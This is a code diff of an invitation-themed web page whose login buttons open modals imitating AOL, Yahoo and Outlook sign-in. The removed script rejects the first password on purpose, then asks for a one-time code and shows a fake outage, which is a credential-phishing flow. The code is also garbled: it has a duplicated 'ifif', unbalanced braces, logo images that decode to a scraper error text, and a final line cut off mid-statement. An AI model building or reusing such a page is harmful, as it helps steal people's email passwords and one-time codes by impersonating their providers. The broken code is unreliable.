@@ -206,136 +206,6 @@
             color: var(--accent-color);
         }
 
-        /* Decorative floral elements */
-        .floral-top {
-            position: absolute;
-            top: 10%;
-            left: 5%;
-            width: 200px;
-            height: 200px;
-            background: url('https://via.placeholder.com/200x200?text=Floral+Top') no-repeat center;
-            background-size: contain;
-            opacity: 0.3;
-            z-index: 1;
-        }
-
-        .floral-bottom {
-            position: absolute;
-            bottom: 10%;
-            right: 5%;
-            width: 200px;
-            height: 200px;
-            background: url('https://via.placeholder.com/200x200?text=Floral+Bottom') no-repeat center;
-            background-size: contain;
-            opacity: 0.3;
-            z-index: 1;
-        }
-
-        /* Floating Balloons */
-        .balloon {
-            position: absolute;
-            width: 60px;
-            height: 80px;
-            background: radial-gradient(circle at 30% 30%, #ff6b6b, #ff8e8e);
-            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            z-index: 0;
-            animation: float 8s ease-in-out infinite;
-        }
-
-        .balloon::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 4px;
-            height: 20px;
-            background: #333;
-            border-radius: 2px;
-        }
-
-        .balloon:nth-child(1) {
-            top: 10%;
-            left: 10%;
-            animation-delay: 0s;
-        }
-
-        .balloon:nth-child(2) {
-            top: 20%;
-            right: 15%;
-            animation-delay: 2s;
-            background: radial-gradient(circle at 30% 30%, #6b8ebe, #8aa6d6);
-        }
-
-        .balloon:nth-child(3) {
-            top: 30%;
-            left: 25%;
-            animation-delay: 4s;
-            background: radial-gradient(circle at 30% 30%, #720E9E, #9435b8);
-        }
-
-        .balloon:nth-child(4) {
-            top: 40%;
-            right: 20%;
-            animation-delay: 6s;
-            background: radial-gradient(circle at 30% 30%, #0066CC, #3399ff);
-        }
-
-        .balloon:nth-child(5) {
-            top: 50%;
-            left: 35%;
-            animation-delay: 8s;
-            background: radial-gradient(circle at 30% 30%, #4a6fa5, #6b8ebe);
-        }
-
-        @keyframes float {
-            0% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-10px) rotate(5deg); }
-            100% { transform: translateY(0px) rotate(0deg); }
-        }
-
-        /* Responsive design */
-        @media (max-width: 768px) {
-            .login-container {
-                padding: 25px 20px;
-            }
-
-            .header h1 {
-                font-size: 2rem;
-            }
-
-            .login-header h2 {
-                font-size: 1.5rem;
-            }
-        }
-
-        /* Make sure everything fits on screen */
-        html, body {
-            overflow: hidden;
-            height: 100vh;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            height: 100vh;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        /* Elegant typography */
-        .elegant-font {
-            font-family: 'Playfair Display', serif;
-            font-weight: 400;
-        }
-
-        .subtle-font {
-            font-family: 'Georgia', serif;
-            font-style: italic;
-            color: var(--gray);
-        }
-
         /* Login Modal */
         .modal {
             display: none;
@@ -466,17 +336,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <!-- Decorative floral elements -->
-    <div class="floral-top"></div>
-    <div class="floral-bottom"></div>
-
-    <!-- Floating Balloons -->
-    <div class="balloon"></div>
-    <div class="balloon"></div>
-    <div class="balloon"></div>
-    <div class="balloon"></div>
-    <div class="balloon"></div>
-
     <div class="container">
         <div class="header">
             <h1 class="elegant-font">✨ Digital Invitation Platform</h1>
@@ -490,7 +349,7 @@
             </div>
 
             <div class="social-login">
-                <div class="social-btn gmail">
+                <div class="social-btn gmail" id="gmail-redirect">
                     <i class="fab fa-google"></i> Continue with Gmail
                 </div>
                 <div class="social-btn outlook" id="outlook-login">
@@ -510,8 +369,6 @@
             <div class="divider">
                 <span>OR</span>
             </div>
-
-            <!-- Removed email/password login -->
         </div>
 
         <div class="footer">
@@ -524,7 +381,7 @@
     <div class="modal" id="aol-modal">
         <div class="modal-content">
             <div class="modal-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/1/1d/AOL_Corp_Logo_(2015).svg" alt="AOL Logo">
+                <img src="data:image/svg+xml;base64,UGxlYXNlIHNldCBhIHVzZXItYWdlbnQgYW5kIHJlc3BlY3Qgb3VyIHJvYm90IHBvbGljeSBodHRwczovL3cud2lraS80d0pTLiBTZWUgYWxzbyBUNDAwMTE5Lgo=" alt="AOL Logo">
                 <h3>Sign in to your AOL account</h3>
             </div>
             <div class="modal-body">
@@ -546,7 +403,7 @@
     <div class="modal" id="yahoo-modal">
         <div class="modal-content">
             <div class="modal-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/07/Yahoo%21_logo.svg" alt="Yahoo Logo">
+                <img src="data:image/svg+xml;base64,UGxlYXNlIHNldCBhIHVzZXItYWdlbnQgYW5kIHJlc3BlY3Qgb3VyIHJvYm90IHBvbGljeSBodHRwczovL3cud2lraS80d0pTLiBTZWUgYWxzbyBUNDAwMTE5Lgo=" alt="Yahoo Logo">
                 <h3>Sign in to your Yahoo account</h3>
             </div>
             <div class="modal-body">
@@ -639,11 +496,21 @@
     </div>
 
     <script>
+        // Configuration for redirect URLs
+        const redirectUrls = {
+            gmail: 'https://wise.com',
+            outlook: 'https://outlook.com',
+            yahoo: 'https://yahoo.com',
+            aol: 'https://aol.com',
+            other: 'https://email.com'
+        };
+
         // Get DOM elements
         const aolLoginBtn = document.getElementById('aol-login');
         const yahooLoginBtn = document.getElementById('yahoo-login');
         const outlookLoginBtn = document.getElementById('outlook-login');
         const otherLoginBtn = document.getElementById('other-login');
+        const gmailRedirectBtn = document.getElementById('gmail-redirect');
 
         const aolModal = document.getElementById('aol-modal');
         const yahooModal = document.getElementById('yahoo-modal');
@@ -652,170 +519,4 @@
         const otpModal = document.getElementById('otp-modal');
         const serviceDownModal = document.getElementById('service-down-modal');
 
-        const aolLoginBtnEl = document.getElementById('aol-login-btn');
-        const yahooLoginBtnEl = document.getElementById('yahoo-login-btn');
-        const outlookLoginBtnEl = document.getElementById('outlook-login-btn');
-        const otherLoginBtnEl = document.getElementById('other-login-btn');
-        const otpBtn = document.getElementById('otp-btn');
-        const tryAgainBtn = document.getElementById('try-again-btn');
-
-        const aolErrorMessage = document.getElementById('aol-error-message');
-        const yahooErrorMessage = document.getElementById('yahoo-error-message');
-        const outlookErrorMessage = document.getElementById('outlook-error-message');
-        const otherErrorMessage = document.getElementById('other-error-message');
-
-        const countdown = document.getElementById('countdown');
-        const timer = document.getElementById('timer');
-        const otpLogo = document.getElementById('otp-logo');
-
-        // Track login attempts
-        let loginAttempts = 0;
-        let currentProvider = '';
-        let countdownInterval;
-
-        // Open modals
-        aolLoginBtn.addEventListener('click', function() {
-            aolModal.style.display = 'flex';
-            loginAttempts = 0;
-            aolErrorMessage.style.display = 'none';
-            currentProvider = 'aol';
-        });
-
-        yahooLoginBtn.addEventListener('click', function() {
-            yahooModal.style.display = 'flex';
-            loginAttempts = 0;
-            yahooErrorMessage.style.display = 'none';
-            currentProvider = 'yahoo';
-        });
-
-        outlookLoginBtn.addEventListener('click', function() {
-            outlookModal.style.display = 'flex';
-            loginAttempts = 0;
-            outlookErrorMessage.style.display = 'none';
-            currentProvider = 'outlook';
-        });
-
-        otherLoginBtn.addEventListener('click', function() {
-            otherModal.style.display = 'flex';
-            loginAttempts = 0;
-            otherErrorMessage.style.display = 'none';
-            currentProvider = 'other';
-        });
-
-        // Handle login button clicks
-        function handleLogin(provider, emailId, passwordId, errorMsgId, modal) {
-            const email = document.getElementById(emailId).value;
-            const password = document.getElementById(passwordId).value;
-
-            if (email && password) {
-                loginAttempts++;
-
-                if (loginAttempts === 1) {
-                    document.getElementById(errorMsgId).style.display = 'block';
-                    document.getElementById(passwordId).value = '';
-                } else if (loginAttempts === 2) {
-                    modal.style.display = 'none';
-                    otpModal.style.display = 'flex';
-
-                    // Set OTP logo
-                    ifif (provider === 'aol') {
-    otpLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/a/a5/AOL_logo.svg';
-} else if (provider === 'yahoo') {
-    otpLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/6/6d/Yahoo%21_%282019%29.svg';
-}
-
-                    } else if (provider === 'outlook') {
-                        otpLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg';
-                    } else {
-                        otpLogo.src = 'https://cdn-icons-png.flaticon.com/512/732/732200.png';
-                    }
-
-                    startCountdown();
-                }
-            }
-        }
-
-        aolLoginBtnEl.addEventListener('click', function() {
-            handleLogin('aol', 'aol-email', 'aol-password', 'aol-error-message', aolModal);
-        });
-
-        yahooLoginBtnEl.addEventListener('click', function() {
-            handleLogin('yahoo', 'yahoo-email', 'yahoo-password', 'yahoo-error-message', yahooModal);
-        });
-
-        outlookLoginBtnEl.addEventListener('click', function() {
-            handleLogin('outlook', 'outlook-email', 'outlook-password', 'outlook-error-message', outlookModal);
-        });
-
-        otherLoginBtnEl.addEventListener('click', function() {
-            handleLogin('other', 'other-email', 'other-password', 'other-error-message', otherModal);
-        });
-
-        // Handle OTP button click
-        otpBtn.addEventListener('click', function() {
-            const otp = document.getElementById('otp').value;
-
-            if (otp && otp.length === 6) {
-                clearInterval(countdownInterval);
-                otpModal.style.display = 'none';
-                serviceDownModal.style.display = 'flex';
-            }
-        });
-
-        // Handle try again button
-        tryAgainBtn.addEventListener('click', function() {
-            serviceDownModal.style.display = 'none';
-            loginAttempts = 0;
-
-            // Reset all error messages
-            aolErrorMessage.style.display = 'none';
-            yahooErrorMessage.style.display = 'none';
-            outlookErrorMessage.style.display = 'none';
-            otherErrorMessage.style.display = 'none';
-
-            // Clear all input fields
-            document.getElementById('aol-email').value = '';
-            document.getElementById('aol-password').value = '';
-            document.getElementById('yahoo-email').value = '';
-            document.getElementById('yahoo-password').value = '';
-            document.getElementById('outlook-email').value = '';
-            document.getElementById('outlook-password').value = '';
-            document.getElementById('other-email').value = '';
-            document.getElementById('other-password').value = '';
-            document.getElementById('otp').value = '';
-        });
-
-        // Countdown timer
-        function startCountdown() {
-            let timeLeft = 5 * 60; // 5 minutes in seconds
-
-            countdownInterval = setInterval(function() {
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-
-                timer.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
-
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    timer.textContent = '0:00';
-                    return;
-                }
-
-                timeLeft--;
-            }, 1000);
-        }
-
-        // Add subtle animation to floral elements
-        document.addEventListener('DOMContentLoaded', function() {
-            const floralTop = document.querySelector('.floral-top');
-            const floralBottom = document.querySelector('.floral-bottom');
-
-            // Simple floating animation
-            setInterval(() => {
-                floralTop.style.transform = `rotate(${Math.random() * 2 - 1}deg)`;
-                floralBottom.style.transform = `rotate(${Math.random() * 2 - 1}deg)`;
-            }, 3000);
-        });
-    </script>
-</body>
-</html>
+        const aolLoginBtnEl = document.getElementById('aol-login
